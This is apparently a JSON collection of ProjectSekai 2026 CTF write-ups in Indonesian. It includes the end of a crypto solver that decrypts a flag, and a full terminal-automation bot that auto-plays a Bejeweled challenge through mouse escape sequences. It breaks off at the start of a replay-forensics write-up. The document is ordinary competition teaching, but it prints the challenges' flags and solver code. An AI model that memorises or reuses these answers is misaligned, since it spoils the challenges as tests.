\"big\"), AES.MODE_ECB).decrypt(ciphertext),\r\n                    16,\r\n                )\r\n            except ValueError:\r\n                continue\r\n\r\n            if re.fullmatch(rb\"[A-Za-z0-9_]+\\{[^\\r\\n{}]+\\}\", plaintext) is None:\r\n                continue\r\n\r\n            return Recovered(P, p, A, a, b, X, tuple(moons), plaintext)\r\n\r\n    return None\r\n\r\n\r\ndef solve(orbit: list[int], ciphertext: bytes) -> Recovered:\r\n    if len(orbit) != 14:\r\n        raise ValueError(\"the attack expects exactly 14 orbit outputs\")\r\n\r\n    differences = [orbit[i + 1] - orbit[i] for i in range(13)]\r\n    public_kernel = build_public_kernel(differences)\r\n    p, a, relations = recover_inner_parameters(public_kernel)\r\n    delta_candidates = recover_moon_differences(p, a, relations)\r\n\r\n    for candidate in delta_candidates:\r\n        recovered = try_outer_recovery(p, a, candidate, orbit, ciphertext)\r\n        if recovered is not None:\r\n            return recovered\r\n    raise RuntimeError(\"all recovered moon-difference orientations failed validation\")\r\n\r\n\r\ndef main() -> None:\r\n    recovered = solve(ORBIT, STAR)\r\n    print(f\"[+] p = {recovered.p}\")\r\n    print(f\"[+] a = {recovered.a}\")\r\n    print(f\"[+] P = {recovered.P}\")\r\n    print(f\"[+] A = {recovered.A}\")\r\n    print(f\"[+] X = {recovered.X}\")\r\n    print(\"[+] full orbit regeneration: valid\")\r\n    print(f\"<FLAG>{recovered.flag.decode()}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{orbital_strike_like_miku_miku_beam!!!}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-misc-bejeweled",
    "title": "Bejeweled",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Bejeweled",
    "problemDescription": "",
    "tools": [],
    "analysis": "Ketika service dibuka menggunakan `socat`, server mengirim antarmuka terminal penuh dengan ANSI escape sequence.\n\nTampilan awal berisi tombol:\n\n```text\n[ Start ]\n```\n\nSetelah tombol ditekan, muncul board berukuran:\n\n```text\n12 baris × 7 kolom\n```\n\nGem yang digunakan:\n\n```text\n▲  ♢  ◼  ♣  ♠  ●  ♡\n```\n\nServer juga mengaktifkan mouse tracking pada terminal. Artinya input bukan berupa koordinat teks biasa, tetapi event mouse terminal.\n\nContoh event klik menggunakan SGR mouse protocol:\n\n```python\npress = f\"\\x1b[<0;{x};{y}M\"\nrelease = f\"\\x1b[<0;{x};{y}m\"\n```\n\nKarena service memakai antarmuka terminal interaktif, solver perlu melakukan dua pekerjaan:\n\n1. Mengemulasikan terminal untuk membaca board.\n2. Mengirim event klik mouse untuk menukar gem.\n\n---",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Category:** Misc\n**Description:**\n\n> The stage is yours. Clear the board before the final note fades.\n\nConnection:\n\n\n\nFlag:\n\n\n\n---",
        "code": "socat -,raw,echo=0 tcp:bejeweled.chals.sekai.team:1337"
      },
      {
        "title": "Overview",
        "content": "Challenge ini menampilkan game Bejeweled berbasis terminal. Pemain harus menukar dua gem yang bersebelahan agar membentuk minimal tiga simbol yang sama secara horizontal atau vertikal.\n\nTarget skor bertambah setiap level:\n\n\n\nMasalahnya, seluruh permainan harus diselesaikan dalam sekitar 45 detik. Bermain manual tidak cukup cepat, sehingga dibutuhkan autosolver.\n\n---",
        "code": "Level 1 → 2500\nLevel 2 → 5000\nLevel 3 → 7500\nLevel 4 → 10000"
      },
      {
        "title": "Terminal Emulation",
        "content": "Library `pyte` digunakan untuk memproses ANSI escape sequence dari server.\n\n\n\nIsi terminal kemudian dapat dibaca melalui:\n\n\n\nDari setiap baris, solver mencari tujuh simbol gem.\n\nMapping simbol:\n\n\n\nSempat terdapat bug pada parser karena karakter kotak yang muncul adalah:\n\n\n\nbukan:\n\n\n\nAkibatnya parser hanya mendeteksi enam gem per baris dan gagal mengenali board. Setelah `◼` ditambahkan ke mapping, board berhasil dibaca.\n\n---",
        "code": "import pyte\n\nscreen = pyte.Screen(80, 25)\nstream = pyte.Stream(screen)\nstream.feed(data.decode(errors=\"ignore\"))"
      },
      {
        "title": "Starting the Game",
        "content": "Tombol `Start` juga harus ditekan menggunakan mouse terminal.\n\nSolver mencoba beberapa mouse protocol karena terminal server dapat menggunakan mode yang berbeda:\n\n* SGR\n* X10\n* URXVT\n\nContoh fungsi klik SGR:\n\n\n\nPosisi tombol dicari dari layar virtual:\n\n\n\nSetelah board muncul, koordinat terminal setiap gem disimpan. Dengan begitu solver dapat mengubah koordinat board seperti `R4C5` menjadi koordinat terminal sebenarnya.\n\n---",
        "code": "def click_sgr(io, x, y):\n    io.send(f\"\\x1b[<0;{x};{y}M\".encode())\n    io.send(f\"\\x1b[<0;{x};{y}m\".encode())"
      },
      {
        "title": "Finding Valid Moves",
        "content": "Untuk setiap sel, solver mencoba swap ke kanan dan ke bawah.\n\n\n\nSetelah dua gem ditukar secara lokal, solver memeriksa apakah terbentuk rangkaian minimal tiga simbol yang sama.\n\nPencarian horizontal:\n\n\n\nPencarian vertikal dilakukan dengan metode yang sama.\n\nSwap dianggap valid apabila salah satu dari dua sel yang ditukar menjadi bagian dari match.\n\n---",
        "code": "neighbours = [\n    (row, col + 1),\n    (row + 1, col),\n]"
      },
      {
        "title": "Move Selection",
        "content": "Versi awal solver memilih langkah berdasarkan jumlah gem yang langsung hilang.\n\n\n\nSolver juga memberikan nilai tambahan untuk pola silang karena berpotensi menghasilkan match lebih besar.\n\n\n\nSetiap iterasi:\n\n1. Baca board.\n2. Cari seluruh swap valid.\n3. Pilih move dengan skor tertinggi.\n4. Klik gem pertama.\n5. Klik gem kedua.\n6. Tunggu board berubah.\n7. Ulangi.\n\nContoh output:\n\n\n\n---",
        "code": "score = len(matched_cells) * 100"
      },
      {
        "title": "Performance Problem",
        "content": "Solver pertama sebenarnya bekerja, tetapi terlalu lambat.\n\nRun awal berhenti pada:\n\n\n\nTarget terakhir adalah 10000, sehingga solver hanya kekurangan sekitar 550 poin.\n\nPenyebab utama perlambatan:\n\n* Polling terminal terlalu lama.\n* `pyte.screen.display` merender seluruh layar setiap iterasi.\n* Delay mouse terlalu besar.\n* Output setiap move dicetak melalui terminal dan `tee`.\n\nBeberapa interval kemudian diperkecil:\n\n\n\nUkuran layar virtual juga diperkecil:\n\n\n\nSelain itu, output solver diarahkan ke file agar render terminal tidak menjadi bottleneck:\n\n\n\n---",
        "code": "Level: 4\nScore: 9450\nTime: 44"
      },
      {
        "title": "Connection Issues",
        "content": "Service terkadang menolak koneksi karena banyak percobaan dalam waktu singkat.\n\nContoh error:\n\n\n\nDNS service mengarah ke:\n\n\n\nKoneksi diuji langsung menggunakan Python:\n\n\n\nOutput:\n\n\n\nByte tersebut menunjukkan bahwa service aktif dan sedang mengirim ANSI escape sequence untuk alternate screen.\n\nAgar tidak terkena connection limit, solver menunggu beberapa detik sebelum retry.\n\n---",
        "code": "Could not connect to 136.68.41.243 on port 1337"
      },
      {
        "title": "Execution",
        "content": "Solver dijalankan menggunakan:\n\n\n\nKemudian flag dicari dari log:\n\n\n\nSetelah solver berhasil melewati skor 10000 sebelum timer habis, server mengirim flag.\n\n---",
        "code": "source /home/nata/ctf_env/bin/activate\npip install pwntools pyte\npython3 solve.py > run.log 2>&1"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport codecs\r\nimport re\r\nimport sys\r\nimport time\r\nimport socket\r\nfrom dataclasses import dataclass\r\n\r\nimport pyte\r\nfrom pwn import context, remote\r\n\r\nHOST = \"bejeweled.chals.sekai.team\"\r\nPORT = 1337\r\n\r\nROWS = 12\r\nCOLS = 7\r\n\r\nTERM_WIDTH = 80\r\nTERM_HEIGHT = 25\r\n\r\nGEMS = {\r\n    \"♣\": \"C\",\r\n    \"♧\": \"C\",\r\n\r\n    \"●\": \"O\",\r\n    \"○\": \"O\",\r\n    \"•\": \"O\",\r\n\r\n    \"♦\": \"D\",\r\n    \"♢\": \"D\",\r\n    \"◆\": \"D\",\r\n    \"◇\": \"D\",\r\n    \"◊\": \"D\",\r\n\r\n    \"♥\": \"H\",\r\n    \"♡\": \"H\",\r\n\r\n    \"♠\": \"S\",\r\n    \"♤\": \"S\",\r\n\r\n    \"▲\": \"T\",\r\n    \"△\": \"T\",\r\n\r\n    \"■\": \"Q\",\r\n    \"□\": \"Q\",\r\n    \"▪\": \"Q\",\r\n    \"▫\": \"Q\",\r\n    \"⬛\": \"Q\",\r\n    \"⬜\": \"Q\",\r\n    \"◼\": \"Q\",\r\n}\r\n\r\nFLAG_RE = re.compile(r\"(?:SEKAI|sekai)\\{[^}\\r\\n]+\\}\")\r\n\r\nANSI_RE = re.compile(\r\n    r\"(?:\\x1b\\][^\\x07]*(?:\\x07|\\x1b\\\\))|\"\r\n    r\"(?:\\x1b[P^_].*?\\x1b\\\\)|\"\r\n    r\"(?:\\x1b\\[[0-?]*[ -/]*[@-~])\",\r\n    re.DOTALL,\r\n)\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass BoardState:\r\n    board: tuple[tuple[str, ...], ...]\r\n    coords: tuple[tuple[tuple[int, int], ...], ...]\r\n\r\n    @property\r\n    def signature(self) -> str:\r\n        return \"\".join(\"\".join(row) for row in self.board)\r\n\r\n\r\nclass Game:\r\n    def __init__(self):\r\n        context.log_level = \"error\"\r\n\r\n        ip = socket.gethostbyname(HOST)\r\n        print(f\"[*] Connecting to {HOST} ({ip}):{PORT}\")\r\n        self.io = remote(ip, PORT, timeout=8)\r\n        self.screen = pyte.Screen(\r\n            TERM_WIDTH,\r\n            TERM_HEIGHT,\r\n        )\r\n\r\n        self.stream = pyte.Stream(self.screen)\r\n\r\n        self.decoder = codecs.getincrementaldecoder(\r\n            \"utf-8\"\r\n        )(\"ignore\")\r\n\r\n        self.raw = bytearray()\r\n        self.transcript = \"\"\r\n        self._line_cache = [\r\n            \" \" * TERM_WIDTH\r\n            for _ in range(TERM_HEIGHT)\r\n        ]\r\n\r\n    def close(self):\r\n        self.io.close()\r\n\r\n    def answer_terminal_queries(self, data: bytes):\r\n        if b\"\\x1b[6n\" in data:\r\n            self.io.send(b\"\\x1b[1;1R\")\r\n\r\n        if b\"\\x1b[c\" in data:\r\n            self.io.send(b\"\\x1b[?1;2c\")\r\n\r\n        if b\"\\x1b[18t\" in data:\r\n            response = (\r\n                f\"\\x1b[8;\"\r\n                f\"{TERM_HEIGHT};\"\r\n                f\"{TERM_WIDTH}t\"\r\n            ).encode()\r\n\r\n            self.io.send(response)\r\n\r\n        if b\"\\x1b[14t\" in data:\r\n            self.io.send(\r\n                b\"\\x1b[4;900;1600t\"\r\n            )\r\n\r\n        if b\"\\x1b]11;?\" in data:\r\n            self.io.send(\r\n                b\"\\x1b]11;\"\r\n                b\"rgb:0000/0000/0000\"\r\n                b\"\\x07\"\r\n            )\r\n\r\n    def pump(self, duration=0.05):\r\n        end_time = time.monotonic() + duration\r\n\r\n        while time.monotonic() < end_time:\r\n            try:\r\n                if not self.io.can_recv(timeout=0.01):\r\n                    continue\r\n\r\n                data = self.io.recv(timeout=0.01)\r\n\r\n            except EOFError:\r\n                return\r\n\r\n            if not data:\r\n                continue\r\n\r\n            self.answer_terminal_queries(data)\r\n\r\n            self.raw.extend(data)\r\n\r\n            if len(self.raw) > 300_000:\r\n                del self.raw[:-300_000]\r\n\r\n            decoded = self.decoder.decode(data)\r\n\r\n            self.transcript = (\r\n                self.transcript + decoded\r\n            )[-300_000:]\r\n\r\n            self.stream.feed(decoded)\r\n\r\n    def lines(self) -> list[str]:\r\n        dirty = set(getattr(self.screen, \"dirty\", set()))\r\n\r\n        if not dirty and not any(\r\n            line.strip() for line in self._line_cache\r\n        ):\r\n            dirty = set(range(TERM_HEIGHT))\r\n\r\n        for y in dirty:\r\n            if not 0 <= y < TERM_HEIGHT:\r\n                continue\r\n\r\n            terminal_line = self.screen.buffer[y]\r\n            rendered = []\r\n\r\n            for x in range(TERM_WIDTH):\r\n                data = terminal_line[x].data\r\n                rendered.append(data if data else \" \")\r\n\r\n            self._line_cache[y] = \"\".join(rendered)\r\n\r\n        if hasattr(self.screen, \"dirty\"):\r\n            self.screen.dirty.clear()\r\n\r\n        return self._line_cache\r\n\r\n    def visible_text(self) -> str:\r\n        return \"\\n\".join(self.lines())\r\n\r\n    def find_flag(self) -> str | None:\r\n        sources = (\r\n            self.visible_text(),\r\n            ANSI_RE.sub(\"\", self.transcript),\r\n        )\r\n\r\n        for source in sources:\r\n            match = FLAG_RE.search(source)\r\n\r\n            if match:\r\n                return match.group(0)\r\n\r\n        return None\r\n\r\n    def find_text(\r\n        self,\r\n        text: str,\r\n    ) -> tuple[int, int] | None:\r\n\r\n        for y, line in enumerate(\r\n            self.lines(),\r\n            start=1,\r\n        ):\r\n            position = line.find(text)\r\n\r\n            if position >= 0:\r\n                x = (\r\n                    position\r\n                    + len(text) // 2\r\n                    + 1\r\n                )\r\n\r\n                return x, y\r\n\r\n        return None\r\n\r\n    def click_sgr(self, x: int, y: int):\r\n        self.io.send(\r\n            f\"\\x1b[<0;{x};{y}M\".encode()\r\n        )\r\n\r\n        time.sleep(0.002)\r\n\r\n        self.io.send(\r\n            f\"\\x1b[<0;{x};{y}m\".encode()\r\n        )\r\n\r\n    def click_x10(self, x: int, y: int):\r\n        press = (\r\n            b\"\\x1b[M\"\r\n            + bytes((\r\n                32,\r\n                x + 32,\r\n                y + 32,\r\n            ))\r\n        )\r\n\r\n        release = (\r\n            b\"\\x1b[M\"\r\n            + bytes((\r\n                35,\r\n                x + 32,\r\n                y + 32,\r\n            ))\r\n        )\r\n\r\n        self.io.send(press)\r\n        time.sleep(0.002)\r\n        self.io.send(release)\r\n\r\n    def click_urxvt(self, x: int, y: int):\r\n        self.io.send(\r\n            f\"\\x1b[32;{x};{y}M\".encode()\r\n        )\r\n\r\n        time.sleep(0.002)\r\n\r\n        self.io.send(\r\n            f\"\\x1b[35;{x};{y}M\".encode()\r\n        )\r\n\r\n    def click(\r\n        self,\r\n        x: int,\r\n        y: int,\r\n        protocol: str | None = None,\r\n    ):\r\n        raw = bytes(self.raw)\r\n\r\n        if protocol is None:\r\n            if b\"\\x1b[?1006h\" in raw:\r\n                protocol = \"sgr\"\r\n            elif b\"\\x1b[?1015h\" in raw:\r\n                protocol = \"urxvt\"\r\n            else:\r\n                protocol = \"x10\"\r\n\r\n        if protocol == \"sgr\":\r\n            self.click_sgr(x, y)\r\n\r\n        elif protocol == \"x10\":\r\n            self.click_x10(x, y)\r\n\r\n        elif protocol == \"urxvt\":\r\n            self.click_urxvt(x, y)\r\n\r\n        else:\r\n            raise ValueError(\r\n                f\"Unknown mouse protocol: {protocol}\"\r\n            )\r\n\r\n\r\ndef parse_board(\r\n    lines: list[str],\r\n) -> BoardState | None:\r\n\r\n    candidate_rows = []\r\n\r\n    for y, line in enumerate(lines):\r\n        hits = []\r\n\r\n        for x, character in enumerate(line):\r\n            if character in GEMS:\r\n                hits.append((\r\n                    x,\r\n                    GEMS[character],\r\n                ))\r\n\r\n        if len(hits) == COLS:\r\n            candidate_rows.append((\r\n                y,\r\n                hits,\r\n            ))\r\n\r\n    for start in range(\r\n        len(candidate_rows) - ROWS + 1\r\n    ):\r\n        chunk = candidate_rows[\r\n            start:start + ROWS\r\n        ]\r\n\r\n        ys = [\r\n            y\r\n            for y, _ in chunk\r\n        ]\r\n\r\n        gaps = [\r\n            next_y - current_y\r\n            for current_y, next_y\r\n            in zip(ys, ys[1:])\r\n        ]\r\n\r\n        if not gaps:\r\n            continue\r\n\r\n        if min(gaps) < 1:\r\n            continue\r\n\r\n        if max(gaps) > 3:\r\n            continue\r\n\r\n        if max(gaps) - min(gaps) > 1:\r\n            continue\r\n\r\n        base_xs = [\r\n            x\r\n            for x, _ in chunk[0][1]\r\n        ]\r\n\r\n        aligned = True\r\n\r\n        for _, hits in chunk[1:]:\r\n            current_xs = [\r\n                x\r\n                for x, _ in hits\r\n            ]\r\n\r\n            for base_x, current_x in zip(\r\n                base_xs,\r\n                current_xs,\r\n            ):\r\n                if abs(base_x - current_x) > 1:\r\n                    aligned = False\r\n                    break\r\n\r\n            if not aligned:\r\n                break\r\n\r\n        if not aligned:\r\n            continue\r\n\r\n        board = tuple(\r\n            tuple(\r\n                gem\r\n                for _, gem in hits\r\n            )\r\n            for _, hits in chunk\r\n        )\r\n\r\n        coords = tuple(\r\n            tuple(\r\n                (\r\n                    x + 1,\r\n                    y + 1,\r\n                )\r\n                for x, _ in hits\r\n            )\r\n            for y, hits in chunk\r\n        )\r\n\r\n        return BoardState(\r\n            board=board,\r\n            coords=coords,\r\n        )\r\n\r\n    return None\r\n\r\n\r\ndef matched_cells(\r\n    board: list[list[str]],\r\n) -> set[tuple[int, int]]:\r\n\r\n    found = set()\r\n\r\n    for row in range(ROWS):\r\n        column = 0\r\n\r\n        while column < COLS:\r\n            end = column + 1\r\n\r\n            while (\r\n                end < COLS\r\n                and board[row][end]\r\n                == board[row][column]\r\n            ):\r\n                end += 1\r\n\r\n            if end - column >= 3:\r\n                for current in range(\r\n                    column,\r\n                    end,\r\n                ):\r\n                    found.add((\r\n                        row,\r\n                        current,\r\n                    ))\r\n\r\n            column = end\r\n\r\n    for column in range(COLS):\r\n        row = 0\r\n\r\n        while row < ROWS:\r\n            end = row + 1\r\n\r\n            while (\r\n                end < ROWS\r\n                and board[end][column]\r\n                == board[row][column]\r\n            ):\r\n                end += 1\r\n\r\n            if end - row >= 3:\r\n                for current in range(\r\n                    row,\r\n                    end,\r\n                ):\r\n                    found.add((\r\n                        current,\r\n                        column,\r\n                    ))\r\n\r\n            row = end\r\n\r\n    return found\r\n\r\n\r\n\r\ndef estimate_cascade(\r\n    board: list[list[str]],\r\n) -> int:\r\n    sim = [row[:] for row in board]\r\n    total = 0\r\n    wave = 0\r\n\r\n    while wave < 8:\r\n        cells = matched_cells(sim)\r\n\r\n        if not cells:\r\n            break\r\n\r\n        wave += 1\r\n\r\n        # Utamakan banyak sel dan cascade bertingkat.\r\n        total += len(cells) * 100\r\n        total += (wave - 1) * 250\r\n\r\n        for row, column in cells:\r\n            sim[row][column] = None\r\n\r\n        # Terapkan gravity. Slot baru dibuat unik agar tidak\r\n        # mengasumsikan warna gem random dari server.\r\n        for column in range(COLS):\r\n            remaining = [\r\n                sim[row][column]\r\n                for row in range(ROWS)\r\n                if sim[row][column] is not None\r\n            ]\r\n\r\n            missing = ROWS - len(remaining)\r\n\r\n            replacement = [\r\n                f\"?{wave}:{column}:{index}\"\r\n                for index in range(missing)\r\n            ] + remaining\r\n\r\n            for row, value in enumerate(replacement):\r\n                sim[row][column] = value\r\n\r\n    return total\r\n\r\ndef find_moves(\r\n    state: BoardState,\r\n):\r\n    board = [\r\n        list(row)\r\n        for row in state.board\r\n    ]\r\n\r\n    legal_moves = []\r\n\r\n    for row in range(ROWS):\r\n        for column in range(COLS):\r\n            neighbours = (\r\n                (row, column + 1),\r\n                (row + 1, column),\r\n            )\r\n\r\n            for next_row, next_column in neighbours:\r\n                if next_row >= ROWS:\r\n                    continue\r\n\r\n                if next_column >= COLS:\r\n                    continue\r\n\r\n                if (\r\n                    board[row][column]\r\n                    == board[next_row][next_column]\r\n                ):\r\n                    continue\r\n\r\n                board[row][column], board[next_row][next_column] = (\r\n                    board[next_row][next_column],\r\n                    board[row][column],\r\n                )\r\n\r\n                cells = matched_cells(board)\r\n\r\n                is_legal = (\r\n                    (row, column) in cells\r\n                    or (\r\n                        next_row,\r\n                        next_column,\r\n                    ) in cells\r\n                )\r\n\r\n                score = estimate_cascade(board)\r\n\r\n                for matched_row, matched_column in cells:\r\n                    horizontal = (\r\n                        0 < matched_column < COLS - 1\r\n                        and board[matched_row][matched_column - 1]\r\n                        == board[matched_row][matched_column]\r\n                        == board[matched_row][matched_column + 1]\r\n                    )\r\n\r\n                    vertical = (\r\n                        0 < matched_row < ROWS - 1\r\n                        and board[matched_row - 1][matched_column]\r\n                        == board[matched_row][matched_column]\r\n                        == board[matched_row + 1][matched_column]\r\n                    )\r\n\r\n                    if horizontal and vertical:\r\n                        score += 500\r\n\r\n                board[row][column], board[next_row][next_column] = (\r\n                    board[next_row][next_column],\r\n                    board[row][column],\r\n                )\r\n\r\n                if is_legal:\r\n                    legal_moves.append((\r\n                        score,\r\n                        (row, column),\r\n                        (\r\n                            next_row,\r\n                            next_column,\r\n                        ),\r\n                    ))\r\n\r\n    legal_moves.sort(\r\n        reverse=True\r\n    )\r\n\r\n    return legal_moves\r\n\r\n\r\ndef wait_for_board(\r\n    game: Game,\r\n    timeout=3.0,\r\n) -> BoardState | None:\r\n\r\n    end_time = (\r\n        time.monotonic()\r\n        + timeout\r\n    )\r\n\r\n    last_state = None\r\n    stable_since = None\r\n\r\n    while time.monotonic() < end_time:\r\n        game.pump(0.012)\r\n\r\n        current = parse_board(\r\n            game.lines()\r\n        )\r\n\r\n        if current is None:\r\n            last_state = None\r\n            stable_since = None\r\n            continue\r\n\r\n        if (\r\n            last_state is not None\r\n            and current.signature\r\n            == last_state.signature\r\n        ):\r\n            if stable_since is None:\r\n                stable_since = (\r\n                    time.monotonic()\r\n                )\r\n\r\n            elif (\r\n                time.monotonic()\r\n                - stable_since\r\n                >= 0.025\r\n            ):\r\n                return current\r\n\r\n        else:\r\n            last_state = current\r\n            stable_since = None\r\n\r\n    return last_state\r\n\r\n\r\ndef wait_for_change(\r\n    game: Game,\r\n    old_signature: str,\r\n    timeout=0.7,\r\n):\r\n    end_time = (\r\n        time.monotonic()\r\n        + timeout\r\n    )\r\n\r\n    last_state = None\r\n    stable_since = None\r\n\r\n    while time.monotonic() < end_time:\r\n        game.pump(0.008)\r\n\r\n        flag = game.find_flag()\r\n\r\n        if flag:\r\n            return flag\r\n\r\n        current = parse_board(\r\n            game.lines()\r\n        )\r\n\r\n        if current is None:\r\n            continue\r\n\r\n        if current.signature == old_signature:\r\n            continue\r\n\r\n        if (\r\n            last_state is not None\r\n            and current.signature\r\n            == last_state.signature\r\n        ):\r\n            if stable_since is None:\r\n                stable_since = (\r\n                    time.monotonic()\r\n                )\r\n\r\n            elif (\r\n                time.monotonic()\r\n                - stable_since\r\n                >= 0.015\r\n            ):\r\n                return current\r\n\r\n        else:\r\n            last_state = current\r\n            stable_since = None\r\n\r\n    return last_state\r\n\r\n\r\ndef read_number(\r\n    game: Game,\r\n    label: str,\r\n) -> int | None:\r\n\r\n    match = re.search(\r\n        rf\"{re.escape(label)}\\s*:\\s*(\\d+)\",\r\n        game.visible_text(),\r\n    )\r\n\r\n    if match:\r\n        return int(match.group(1))\r\n\r\n    return None\r\n\r\n\r\ndef start_game(\r\n    game: Game,\r\n) -> BoardState | None:\r\n\r\n    game.pump(1.0)\r\n\r\n    keyboard_inputs = (\r\n        b\"\\r\",\r\n        b\" \",\r\n        b\"\\t\\r\",\r\n    )\r\n\r\n    for key in keyboard_inputs:\r\n        game.io.send(key)\r\n\r\n        state = wait_for_board(\r\n            game,\r\n            timeout=0.5,\r\n        )\r\n\r\n        if state:\r\n            return state\r\n\r\n    start_position = game.find_text(\r\n        \"Start\"\r\n    )\r\n\r\n    if start_position is None:\r\n        return None\r\n\r\n    x, y = start_position\r\n\r\n    click_points = (\r\n        (x, y),\r\n        (x - 1, y),\r\n        (x + 1, y),\r\n        (x, y - 1),\r\n        (x, y + 1),\r\n    )\r\n\r\n    protocols = (\r\n        \"sgr\",\r\n        \"x10\",\r\n        \"urxvt\",\r\n    )\r\n\r\n    for protocol in protocols:\r\n        for click_x, click_y in click_points:\r\n            game.click(\r\n                click_x,\r\n                click_y,\r\n                protocol=protocol,\r\n            )\r\n\r\n            state = wait_for_board(\r\n                game,\r\n                timeout=0.45,\r\n            )\r\n\r\n            if state:\r\n                return state\r\n\r\n    return None\r\n\r\n\r\ndef solve_once() -> str | None:\r\n    game = Game()\r\n\r\n    try:\r\n        state = start_game(game)\r\n\r\n        if state is None:\r\n            print(\r\n                \"[-] Tombol Start tidak berhasil ditekan.\"\r\n            )\r\n\r\n            print(\r\n                \"[-] Posisi Start:\",\r\n                game.find_text(\"Start\"),\r\n            )\r\n\r\n            enabled_modes = []\r\n\r\n            raw = bytes(game.raw)\r\n\r\n            for mode in (\r\n                1000,\r\n                1002,\r\n                1003,\r\n                1006,\r\n                1015,\r\n            ):\r\n                sequence = (\r\n                    f\"\\x1b[?{mode}h\"\r\n                ).encode()\r\n\r\n                if sequence in raw:\r\n                    enabled_modes.append(mode)\r\n\r\n            print(\r\n                \"[-] Mouse modes:\",\r\n                enabled_modes,\r\n            )\r\n\r\n            print(\r\n                \"[-] Tampilan non-kosong:\"\r\n            )\r\n\r\n            for line_number, line in enumerate(\r\n                game.lines(),\r\n                start=1,\r\n            ):\r\n                if line.strip():\r\n                    print(\r\n                        f\"{line_number:02d}: \"\r\n                        f\"{line.rstrip()}\"\r\n                    )\r\n\r\n            return None\r\n\r\n        move_number = 0\r\n\r\n        while True:\r\n            flag = game.find_flag()\r\n\r\n            if flag:\r\n                return flag\r\n\r\n            moves = find_moves(state)\r\n\r\n            if not moves:\r\n                updated = wait_for_board(\r\n                    game,\r\n                    timeout=1.0,\r\n                )\r\n\r\n                if updated is not None:\r\n                    state = updated\r\n\r\n                moves = find_moves(state)\r\n\r\n                if not moves:\r\n                    print(\r\n                        \"[-] Tidak ada move valid.\"\r\n                    )\r\n                    return None\r\n\r\n            _, first, second = moves[0]\r\n\r\n            first_x, first_y = (\r\n                state.coords[\r\n                    first[0]\r\n                ][\r\n                    first[1]\r\n                ]\r\n            )\r\n\r\n            second_x, second_y = (\r\n                state.coords[\r\n                    second[0]\r\n                ][\r\n                    second[1]\r\n                ]\r\n            )\r\n\r\n            move_number += 1\r\n\r\n            level = read_number(\r\n                game,\r\n                \"Level\",\r\n            )\r\n\r\n            score = read_number(\r\n                game,\r\n                \"Score\",\r\n            )\r\n\r\n            timer = read_number(\r\n                game,\r\n                \"Time\",\r\n            )\r\n\r\n            print(\r\n                f\"[+] move={move_number:03d} \"\r\n                f\"level={level} \"\r\n                f\"score={score} \"\r\n                f\"time={timer} \"\r\n                f\"R{first[0] + 1}\"\r\n                f\"C{first[1] + 1}\"\r\n                f\"<->\"\r\n                f\"R{second[0] + 1}\"\r\n                f\"C{second[1] + 1}\",\r\n                flush=True,\r\n            )\r\n\r\n            old_signature = (\r\n                state.signature\r\n            )\r\n\r\n            game.click(\r\n                first_x,\r\n                first_y,\r\n            )\r\n\r\n            time.sleep(0.002)\r\n\r\n            game.click(\r\n                second_x,\r\n                second_y,\r\n            )\r\n\r\n            result = wait_for_change(\r\n                game,\r\n                old_signature,\r\n            )\r\n\r\n            if isinstance(result, str):\r\n                return result\r\n\r\n            if result is None:\r\n                game.pump(0.2)\r\n\r\n                flag = game.find_flag()\r\n\r\n                if flag:\r\n                    return flag\r\n\r\n                print(\r\n                    \"[-] Board tidak berubah.\"\r\n                )\r\n\r\n                return None\r\n\r\n            state = result\r\n\r\n    except EOFError:\r\n        print(\"[-] Server menutup koneksi (EOF).\")\r\n        flag = game.find_flag()\r\n        if not flag:\r\n            print(\"[-] Tampilan terakhir:\")\r\n            for no, line in enumerate(game.lines(), 1):\r\n                if line.strip():\r\n                    print(f\"{no:02d}: {line.rstrip()}\")\r\n        return flag\r\n\r\n    finally:\r\n        game.close()\r\n\r\ndef main():\r\n    for attempt in range(1, 21):\r\n        print(f\"[*] Attempt {attempt}/20: {HOST}:{PORT}\")\r\n\r\n        try:\r\n            flag = solve_once()\r\n\r\n        except KeyboardInterrupt:\r\n            raise\r\n\r\n        except Exception as error:\r\n            print(f\"[-] Connection/solver error: {type(error).__name__}: {error}\")\r\n            flag = None\r\n\r\n        if flag:\r\n            print(f\"\\n[+] FLAG: {flag}\")\r\n            return\r\n\r\n        print(\"[*] Menunggu 12 detik sebelum mencoba lagi...\")\r\n        time.sleep(12)\r\n\r\n    print(\"[-] Belum berhasil setelah 20 percobaan.\")\r\n    sys.exit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{th3_l4st_d4nc3_By_eana}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-misc-deadgame",
    "title": "deadgame2 — Misc",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Flag: `SeKaiCTF{lol_fl2g_EN_TARO_HERO_GG}`",
    "problemDescription": "Flag: `SeKaiCTF{lol_fl2g_EN_TARO_HERO_GG}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "Replay SC2-nya masih bisa dibuka sebagai MPQ walaupun magic awal sengaja diubah dari `MPQ\\x1a` menjadi `MPQ\\x1b`. Header MPQ valid ada di offset `0x400`, jadi isi replay tetap bisa diekstrak. Chat event memberi kerangka flag, sementara tiga bagian kosongnya disembunyikan sebagai tulisan dari posisi unit yang mati."
      },
      {
        "title": "Langkah",
